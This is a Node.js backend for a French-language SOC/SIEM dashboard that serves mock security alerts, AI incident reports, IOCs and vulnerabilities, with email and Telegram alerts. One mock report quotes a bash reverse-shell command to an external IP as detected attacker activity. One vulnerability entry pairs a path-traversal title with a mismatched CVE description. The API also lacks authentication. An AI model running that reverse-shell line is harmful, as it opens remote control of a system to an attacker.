import express from 'express';
import cors from 'cors';
import http from 'http';
import https from 'https';
import { WebSocketServer, WebSocket } from 'ws';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import nodemailer from 'nodemailer';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DB_FILE = path.join(__dirname, 'db.json');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocketServer({ server });

// Base de données par défaut (Mock Data)
const defaultDb = {
  agents: [
    { id: "agt-001", name: "soc-web-prod-01", ip_address: "10.100.12.45", os: "Ubuntu 22.04 LTS", status: "Online", last_keep_alive: "2026-07-18 15:42:12", cpu_usage: 24.5, ram_usage: 62.1, version: "Wazuh v4.7.2" },
    { id: "agt-002", name: "soc-db-mysql-01", ip_address: "10.100.12.46", os: "RedHat Enterprise 9", status: "Online", last_keep_alive: "2026-07-18 15:42:01", cpu_usage: 45.2, ram_usage: 81.7, version: "Wazuh v4.7.2" },
    { id: "agt-003", name: "soc-ad-controller", ip_address: "10.100.10.10", os: "Windows Server 2022", status: "Online", last_keep_alive: "2026-07-18 15:42:15", cpu_usage: 12.8, ram_usage: 55.4, version: "Wazuh v4.7.1" },
    { id: "agt-004", name: "rayane-virtual-machine", ip_address: "192.168.1.100", os: "Kali Linux 2024.1", status: "Online", last_keep_alive: "2026-07-18 15:42:25", cpu_usage: 68.4, ram_usage: 74.2, version: "Wazuh v4.7.2" },
    { id: "agt-005", name: "soc-mail-gateway", ip_address: "10.100.10.22", os: "Debian 12 Bookworm", status: "Offline", last_keep_alive: "2026-07-18 11:15:00", cpu_usage: 0.0, ram_usage: 0.0, version: "Wazuh v4.7.0" },
    { id: "agt-006", name: "soc-bastion-ssh", ip_address: "10.100.5.2", os: "Ubuntu 22.04 LTS", status: "Online", last_keep_alive: "2026-07-18 15:42:18", cpu_usage: 5.6, ram_usage: 28.3, version: "Wazuh v4.7.2" },
    { id: "agt-007", name: "soc-endpoint-rayane", ip_address: "10.100.40.115", os: "Windows 11 Enterprise", status: "Online", last_keep_alive: "2026-07-18 15:41:59", cpu_usage: 18.2, ram_usage: 44.9, version: "Wazuh v4.7.2" },
    { id: "agt-008", name: "soc-cloud-proxy", ip_address: "172.16.50.88", os: "Alpine Linux 3.19", status: "Online", last_keep_alive: "2026-07-18 15:42:08", cpu_usage: 8.9, ram_usage: 19.4, version: "Wazuh v4.7.1" }
  ],
  events: [
    { id: 1, timestamp: "2026-07-18 15:40:44", hostname: "soc-web-prod-01", src_ip: "185.220.101.44", dest_ip: "10.100.12.45", dest_port: 443, category: "SQL Injection", rule_id: 100021, severity: "Critical", action_taken: "Dropped" },
    { id: 2, timestamp: "2026-07-18 15:39:12", hostname: "soc-bastion-ssh", src_ip: "45.142.120.9", dest_ip: "10.100.5.2", dest_port: 22, category: "SSH Brute Force", rule_id: 100004, severity: "High", action_taken: "Logged" },
    { id: 3, timestamp: "2026-07-18 15:38:01", hostname: "soc-ad-controller", src_ip: "10.100.40.115", dest_ip: "10.100.10.10", dest_port: 389, category: "LDAP Bind Request", rule_id: 200054, severity: "Low", action_taken: "Allowed" },
    { id: 4, timestamp: "2026-07-18 15:36:19", hostname: "rayane-virtual-machine", src_ip: "127.0.0.1", dest_ip: "127.0.0.1", dest_port: 8080, category: "Local Port Scan", rule_id: 300109, severity: "Medium", action_taken: "Logged" },
    { id: 5, timestamp: "2026-07-18 15:35:45", hostname: "soc-web-prod-01", src_ip: "192.168.1.100", dest_ip: "10.100.12.45", dest_port: 80, category: "HTTP Directory Traversal", rule_id: 100033, severity: "High", action_taken: "Dropped" },
    { id: 6, timestamp: "2026-07-18 15:33:02", hostname: "soc-db-mysql-01", src_ip: "10.100.12.45", dest_ip: "10.100.12.46", dest_port: 3306, category: "MySQL Admin Query", rule_id: 400102, severity: "Low", action_taken: "Allowed" },
    { id: 7, timestamp: "2026-07-18 15:31:12", hostname: "soc-mail-gateway", src_ip: "91.240.118.52", dest_ip: "10.100.10.22", dest_port: 25, category: "SMTP Spam Wave", rule_id: 500021, severity: "Medium", action_taken: "Quarantined" },
    { id: 8, timestamp: "2026-07-18 15:30:00", hostname: "soc-endpoint-rayane", src_ip: "10.100.40.115", dest_ip: "142.250.190.46", dest_port: 443, category: "DNS Query Exfiltration", rule_id: 100088, severity: "Critical", action_taken: "Blocked" },
    { id: 9, timestamp: "2026-07-18 15:28:15", hostname: "soc-cloud-proxy", src_ip: "8.8.8.8", dest_ip: "172.16.50.88", dest_port: 53, category: "DNS Amplification Response", rule_id: 100099, severity: "Low", action_taken: "Allowed" },
    { id: 10, timestamp: "2026-07-18 15:25:55", hostname: "soc-bastion-ssh", src_ip: "45.142.120.9", dest_ip: "10.100.5.2", dest_port: 22, category: "SSH Session Opened", rule_id: 100001, severity: "Medium", action_taken: "Logged" }
  ],
  alerts: [
    {
      id: 101,
      title: "SQL Injection Attack Detected",
      severity: "Critical",
      description: "An external entity (185.220.101.44) initiated a series of crafted GET queries containing 'UNION SELECT' and '--' sequences against 'soc-web-prod-01' database handlers, attempting schemas enumeration.",
      rule_id: 100021,
      timestamp: "2026-07-18 15:40:44",
      xgboost_probability: 99.64,
      analyst_assigned: "Rayane (SecOps)",
      status: "New",
      ai_report_id: null
    },
    {
      id: 102,
      title: "Persistent SSH Brute Force",
      severity: "High",
      description: "Bastion SSH service report over 450 failed authentication attempts within 3 minutes from IP 45.142.120.9 using lists of common administrative accounts.",
      rule_id: 100004,
      timestamp: "2026-07-18 15:39:12",
      xgboost_probability: 92.15,
      analyst_assigned: "Unassigned",
      status: "New",
      ai_report_id: null
    },
    {
      id: 103,
      title: "Kerberoasting Activity Detected",
      severity: "High",
      description: "Host soc-endpoint-rayane (10.100.40.115) generated multiple TGS requests for service accounts with weak RC4 encryption. Indicative of Kerberoasting credential recovery attacks.",
      rule_id: 200450,
      timestamp: "2026-07-18 14:55:34",
      xgboost_probability: 88.42,
      analyst_assigned: "Rayane (SecOps)",
      status: "Acknowledged",
      ai_report_id: 1
    },
    {
      id: 104,
      title: "Unauthorized DNS Tunneling Channel",
      severity: "Critical",
      description: "Endpoint soc-endpoint-rayane opened dynamic subdomains requests containing base64 data structures directed to external name server. Indicates potential data extraction tunneling.",
      rule_id: 100088,
      timestamp: "2026-07-18 15:30:00",
      xgboost_probability: 98.78,
      analyst_assigned: "Unassigned",
      status: "New",
      ai_report_id: null
    },
    {
      id: 105,
      title: "Outbound Shell Spawned from Proxy Node",
      severity: "Critical",
      description: "Active bash shell execution detected running under daemon service on soc-cloud-proxy node, connecting outbound to unauthorized TCP port 8080.",
      rule_id: 100650,
      timestamp: "2026-07-18 14:48:44",
      xgboost_probability: 99.89,
      analyst_assigned: "Rayane (SecOps)",
      status: "Resolved",
      ai_report_id: 2
    }
  ],
  aiReports: [
    {
      id: 1,
      alert_id: 103,
      generated_at: "2026-07-18 15:02:10",
      markdown_content: "# Synthèse de la Menace\nL'alerte concerne une activité de type **Kerberoasting** sur le contrôleur de domaine Active Directory. Cette technique consiste à demander des tickets de service (TGS) chiffrés pour les déchiffrer hors ligne afin de récupérer les mots de passe des comptes de service en clair.\n\n# Analyse Technique\n- **Acteur de Menace** : Agent interne `10.100.40.115` (`soc-endpoint-rayane`).\n- **Comportement suspect** : Requêtes TGS massives avec chiffrement RC4 (faible et propice au crackage rapide).\n- **Impact** : Compromission potentielle des privilèges administratifs si un compte de service a un mot de passe faible.\n\n# Playbook de Remédiation\n1. **Désactiver RC4** : Configurer la politique de sécurité pour autoriser uniquement AES-128 et AES-256 dans Kerberos.\n2. **Réinitialiser le mot de passe** du compte cible concerné avec une longueur minimale de 25 caractères.\n3. **Isoler l'hôte** `soc-endpoint-rayane` du réseau interne pour inspection."
    },
    {
      id: 2,
      alert_id: 105,
      generated_at: "2026-07-18 14:50:00",
      markdown_content: "# Synthèse de la Menace\nDétection d'un **Reverse Shell** initié depuis la VM `soc-cloud-proxy` vers l'IP malveillante externe `203.0.113.5`. C'est un indicateur fort d'accès initial réussi par un attaquant suivi d'une tentative de commande et contrôle (C2).\n\n# Analyse Technique\n- **Processus Parent** : `nginx` (Web Proxy)\n- **Processus Enfant** : `/bin/bash -i >& /dev/tcp/203.0.113.5/8080`\n- **Modèle XGBoost** : Confiance de détection de 99.89%.\n\n# Playbook de Remédiation\n1. **Tuer la session TCP** : Bloquer immédiatement le port `8080` et l'IP `203.0.113.5` sur le pare-feu externe.\n2. **Tuer le PID** suspect sur le serveur proxy.\n3. **Inspecter le journal d'accès** Nginx pour trouver la vulnérabilité d'exécution de code à distance (RCE) exploitée."
    }
  ],
  fimEvents: [
    { id: 1, filename: "/etc/shadow", hostname: "soc-web-prod-01", event_type: "Modified", old_hash: "a438c89b7c843f019bd8ef2b8df11eab1901c89012a4ee3901b09bca3b22e11a", new_hash: "99cb1902bb3c80ff12a45c6020cde8e1abcf1902df35c46e392ca2bd11ff5a43", modified_by: "root", timestamp: "2026-07-18 15:40:02" },
    { id: 2, filename: "/etc/passwd", hostname: "soc-web-prod-01", event_type: "Modified", old_hash: "123fde1902cae39023bd55abf9b93cf4023de4bca03f02e88a01cbefcf0214a1", new_hash: "123fde1902cae39023bd55abf9b93cf4023de4bca03f02e88a01cbefcf0214a1", modified_by: "systemd", timestamp: "2026-07-18 15:37:12" },
    { id: 3, filename: "/var/www/html/index.php", hostname: "soc-web-prod-01", event_type: "Modified", old_hash: "ee284cf02a394feab8902cdbf3e4fcf50bcae390bd847290decf0e29d0f2a9e1", new_hash: "fcf023ab9bd84cf2a0cf3df84210e3fa0210bcdae394feabd2901cdbf834a9ef", modified_by: "www-data", timestamp: "2026-07-18 15:22:15" },
    { id: 4, filename: "C:\\Windows\\System32\\drivers\\etc\\hosts", hostname: "soc-endpoint-rayane", event_type: "Modified", old_hash: "7ea93dfa910ecbda39fe02adab129fec89320facbdf289fa30dbac90ab12f12a", new_hash: "f938dca098b1fe2a39fe28dca90fa8b27341fe023a8ffbde28fa7b09ca88f28d", modified_by: "rayane", timestamp: "2026-07-18 15:10:45" },
    { id: 5, filename: "/usr/local/bin/backdoor.sh", hostname: "soc-cloud-proxy", event_type: "Added", old_hash: "EMPTY_FILE", new_hash: "82a9fbc102e3a8fae90bfa3a812df0e2cf9023ae8fbcd23ad89fe0bcefa81023", modified_by: "nginx", timestamp: "2026-07-18 14:45:00" },
    { id: 6, filename: "/etc/ssh/sshd_config", hostname: "soc-bastion-ssh", event_type: "Modified", old_hash: "3bfa2cf01bdae23a8bfa932df20acfa8930bcaef910beba8fde8910bcefaefaa", new_hash: "3bfa2cf01bdae23a8bfa932df20acfa8930bcaef910beba8fde8910bcefaefaa", modified_by: "root", timestamp: "2026-07-18 14:15:30" }
  ],
  vulnerabilities: [
    { id: "vuln-1", title: "OpenSSH Remote Code Execution (RegreSSHion)", severity: "Critical", cve_id: "CVE-2024-6387", cvss_score: 9.8, impacted_agents: ["soc-bastion-ssh"], status: "Unpatched", description: "A signal handler race condition vulnerability was discovered in OpenSSH's secure shell server (sshd) where a client can execute arbitrary code with root privileges.", remediation: "Upgrade openssh-server package to version 9.8p1-1 or modify SSH configuration to set LoginGraceTime to 0." },
    { id: "vuln-2", title: "MySQL Server Privilege Escalation", severity: "High", cve_id: "CVE-2023-22001", cvss_score: 8.1, impacted_agents: ["soc-db-mysql-01"], status: "Mitigated", description: "Vulnerability in the MySQL Server product of Oracle MySQL (component: Server: Security: Privileges). Easily exploitable vulnerability allows high privileged attacker to compromise MySQL server.", remediation: "Apply Oracle Critical Patch Update for July 2023, or restrict administrative connections to localhost." },
    { id: "vuln-3", title: "Web Application Path Traversal vulnerability", severity: "High", cve_id: "CVE-2024-3400", cvss_score: 8.8, impacted_agents: ["soc-web-prod-01"], status: "Unpatched", description: "A command injection vulnerability in the GlobalProtect gateway of Palo Alto Networks PAN-OS software allows an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.", remediation: "Install PAN-OS hotfixes or disable telemetry option until patching completes." },
    { id: "vuln-4", title: "Active Directory Domain Privilege Escalation", severity: "Medium", cve_id: "CVE-2023-38115", cvss_score: 6.5, impacted_agents: ["soc-ad-controller"], status: "Patched", description: "Windows Active Directory Domain Services elevation of privilege vulnerability. Allows a local domain user to escalate to Domain Administrator.", remediation: "Apply Microsoft KB5031364 KB update package." }
  ],
  iocs: [
    { id: "ioc-1", value: "185.220.101.44", type: "IP", threat_actor: "Tor Exit Node (Scanners)", description: "Active IP scanning and running vulnerability scanners against web proxy ports.", date_added: "2026-07-18 10:00:00" },
    { id: "ioc-2", value: "45.142.120.9", type: "IP", threat_actor: "China-based Brute Forcer", description: "Persistent SSH brute forcing targeting corporate routers and jump boxes.", date_added: "2026-07-18 11:20:00" },
    { id: "ioc-3", value: "203.0.113.5", type: "IP", threat_actor: "UNC2891 C2 Server", description: "Command and Control server associated with shell script backdoors.", date_added: "2026-07-18 12:45:00" },
    { id: "ioc-4", value: "bad-script-malicious.com", type: "Domain", threat_actor: "Phishing Anchor", description: "Domain used in spam emails to host payload configuration strings.", date_added: "2026-07-18 13:12:00" },
    { id: "ioc-5", value: "82a9fbc102e3a8fae90bfa3a812df0e2cf9023ae8fbcd23ad89fe0bcefa81023", type: "Hash", threat_actor: "CozyBear Linux Backdoor", description: "SHA-256 hash of shell reverse shell backdoor payload placed in /usr/local/bin.", date_added: "2026-07-18 14:46:00" }
  ]
};

// Chargement des données à partir de db.json si existant, sinon création
let db = { ...defaultDb };
if (fs.existsSync(DB_FILE)) {
  try {
    const data = fs.readFileSync(DB_FILE, 'utf8');
    db = JSON.parse(data);
    console.log('[BACKEND] Base de données chargée avec succès depuis db.json');
  } catch (err) {
    console.error('[BACKEND] Erreur lors du chargement de db.json, réinitialisation avec les valeurs par défaut:', err);
  }
} else {
  saveDb();
}

function saveDb() {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2), 'utf8');
    console.log('[BACKEND] Base de données sauvegardée dans db.json');
  } catch (err) {
    console.error('[BACKEND] Impossible d\'écrire dans db.json:', err);
  }
}

// Helper pour diffuser les messages à tous les clients connectés
function broadcast(type, payload) {
  const message = JSON.stringify({ type, payload });
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}

// ── CONFIGURATION DES NOTIFICATIONS ──
let transportConfig = {};
if (process.env.SMTP_SERVICE === 'localhost') {
  transportConfig = {
    host: 'localhost',
    port: 25,
    secure: false,
    tls: { rejectUnauthorized: false }
  };
} else {
  transportConfig = {
    service: process.env.SMTP_SERVICE || 'gmail',
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    }
  };
}
const transporter = nodemailer.createTransport(transportConfig);

function sendEmailAlert(alert, aiReportContent) {
  if (!process.env.NOTIFICATION_EMAIL) return; // Seule l'adresse de destination est requise
  
  const fromEmail = process.env.SMTP_USER || 'siem-alert@soc-ai.local';
  
  const mailOptions = {
    from: fromEmail,
    to: process.env.NOTIFICATION_EMAIL,
    subject: `🚨 [SOC-AI] Alerte de sécurité: ${alert.title}`,
    text: `Gravité: ${alert.severity}\nDescription: ${alert.description}\n\nRapport IA:\n${aiReportContent || 'Non disponible'}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('[EMAIL] Erreur lors de l\'envoi:', error.message);
    } else {
      console.log('[EMAIL] Alerte envoyée:', info.response);
    }
  });
}

function sendTelegramAlert(alert) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  const message = `🚨 *ALERTE SOC-AI* 🚨\n\n*Niveau*: ${alert.severity}\n*Description*: ${alert.description}\n*Certitude*: ${alert.xgboost_probability || 100}%`;
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

  https.get(url, (res) => {
    res.on('data', () => {}); // Consume stream
    if (res.statusCode === 200) {
      console.log('[TELEGRAM] Alerte envoyée avec succès');
    } else {
      console.error(`[TELEGRAM] Erreur d'envoi (Status ${res.statusCode})`);
    }
  }).on('error', (err) => {
    console.error('[TELEGRAM] Erreur réseau:', err.message);
  });
}

// ── ENDPOINTS REST API ──

app.get('/api/agents', (req, res) => {
  res.json(db.agents);
});

app.get('/api/events', (req, res) => {
  res.json(db.events);
});

app.post('/api/events', (req, res) => {
  const newEvent = {
    id: db.events.length > 0 ? Math.max(...db.events.map(e => e.id)) + 1 : 1,
    timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
    ...req.body
  };
  db.events.unshift(newEvent); // Les plus récents en premier
  saveDb();
  broadcast('NEW_EVENT', newEvent);
  res.status(201).json(newEvent);
});

app.get('/api/alerts', (req, res) => {
  res.json(db.alerts);
});

app.post('/api/alerts', (req, res) => {
  const newAlert = {
    id: db.alerts.length > 0 ? Math.max(...db.alerts.map(a => a.id)) + 1 : 101,
    timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
    status: 'New',
    ai_report_id: null,
    analyst_assigned: 'Unassigned',
    ...req.body
  };

  // Si un rapport IA est fourni en même temps (ex: généré par le script Python sur Windows)
  if (req.body.ai_report_content) {
    const newReportId = db.aiReports.length > 0 ? Math.max(...db.aiReports.map(r => r.id)) + 1 : 1;
    const newReport = {
      id: newReportId,
      alert_id: newAlert.id,
      generated_at: new Date().toISOString().replace('T', ' ').substring(0, 19),
      markdown_content: req.body.ai_report_content
    };
    db.aiReports.push(newReport);
    newAlert.ai_report_id = newReportId;
    delete newAlert.ai_report_content;
  }

  db.alerts.unshift(newAlert);
  saveDb();
  broadcast('NEW_ALERT', newAlert);

  // -- DÉCLENCHEMENT DES NOTIFICATIONS --
  if (newAlert.severity === 'Critical' || newAlert.severity === 'High') {
    sendTelegramAlert(newAlert);
    sendEmailAlert(newAlert, req.body.ai_report_content);
  }

  res.status(201).json(newAlert);
});

app.put('/api/alerts/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const alertIndex = db.alerts.findIndex(a => a.id === id);
  if (alertIndex === -1) {
    return res.status(404).json({ error: 'Alerte non trouvée' });
  }

  const updatedAlert = { ...db.alerts[alertIndex], ...req.body };
  db.alerts[alertIndex] = updatedAlert;
  saveDb();
  broadcast('UPDATE_ALERT', updatedAlert);
  res.json(updatedAlert);
});

app.get('/api/reports', (req, res) => {
  res.json(db.aiReports);
});

app.post('/api/reports', (req, res) => {
  const { alert_id, markdown_content } = req.body;
  if (!alert_id || !markdown_content) {
    return res.status(400).json({ error: 'Champs alert_id et markdown_content requis' });
  }

  const alertIndex = db.alerts.findIndex(a => a.id === alert_id);
  if (alertIndex === -1) {
    return res.status(404).json({ error: 'Alerte associée non trouvée' });
  }

  const newReportId = db.aiReports.length > 0 ? Math.max(...db.aiReports.map(r => r.id)) + 1 : 1;
  const newReport = {
    id: newReportId,
    alert_id,
    generated_at: new Date().toISOString().replace('T', ' ').substring(0, 19),
    markdown_content
  };
  db.aiReports.push(newReport);
  db.alerts[alertIndex].ai_report_id = newReportId;
  saveDb();
  broadcast('NEW_REPORT', newReport);
  broadcast('UPDATE_ALERT', db.alerts[alertIndex]);
  res.status(201).json(newReport);
});

app.get('/api/fim', (req, res) => {
  res.json(db.fimEvents);
});

app.get('/api/vulnerabilities', (req, res) => {
  res.json(db.vulnerabilities);
});

app.put('/api/vulnerabilities/:id', (req, res) => {
  const { id } = req.params;
  const vulnIndex = db.vulnerabilities.findIndex(v => v.id === id);
  if (vulnIndex === -1) {
    return res.status(404).json({ error: 'Vulnerabilité non trouvée' });
  }
  db.vulnerabilities[vulnIndex] = { ...db.vulnerabilities[vulnIndex], ...req.body };
  saveDb();
  broadcast('UPDATE_VULNERABILITY', db.vulnerabilities[vulnIndex]);
  res.json(db.vulnerabilities[vulnIndex]);
});

app.get('/api/iocs', (req, res) => {
  res.json(db.iocs);
});

app.post('/api/iocs', (req, res) => {
  const newIoc = {
    id: `ioc-${db.iocs.length > 0 ? Math.max(...db.iocs.map(i => parseInt(i.id.replace('ioc-', '')) || 0)) + 1 : 1}`,
    date_added: new Date().toISOString().replace('T', ' ').substring(0, 19),
    ...req.body
  };
  db.iocs.unshift(newIoc);
  saveDb();
  broadcast('NEW_IOC', newIoc);
  res.status(201).json(newIoc);
});

app.delete('/api/iocs/:id', (req, res) => {
  const { id } = req.params;
  const iocIndex = db.iocs.findIndex(i => i.id === id);
  if (iocIndex === -1) {
    return res.status(404).json({ error: 'IOC non trouvé' });
  }
  const deleted = db.iocs.splice(iocIndex, 1)[0];
  saveDb();
  broadcast('DELETE_IOC', deleted);
  res.json(deleted);
});

app.put('/api/agents/:id', (req, res) => {
  const { id } = req.params;
  const agentIndex = db.agents.findIndex(a => a.id === id);
  if (agentIndex === -1) {
    return res.status(404).json({ error: 'Agent non trouvé' });
  }
  db.agents[agentIndex] = { ...db.agents[agentIndex], ...req.body };
  saveDb();
  broadcast('UPDATE_AGENT', db.agents[agentIndex]);
  res.json(db.agents[agentIndex]);
});

// WebSocket connection setup
wss.on('connection', (ws) => {
  console.log('[WEBSOCKET] Nouveau client connecté');
  ws.send(JSON.stringify({ type: 'INFO', payload: 'Connecté au serveur SIEM Realtime' }));
  
  ws.on('close', () => {
    console.log('[WEBSOCKET] Client déconnecté');
  });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`====================================================`);
  console.log(`[SIEM BACKEND] Serveur démarré avec succès.`);
  console.log(`[REST API]   Disponible sur http://localhost:${PORT}/api`);
  console.log(`[WEBSOCKET]  Disponible sur ws://localhost:${PORT}`);
  console.log(`====================================================`);
});
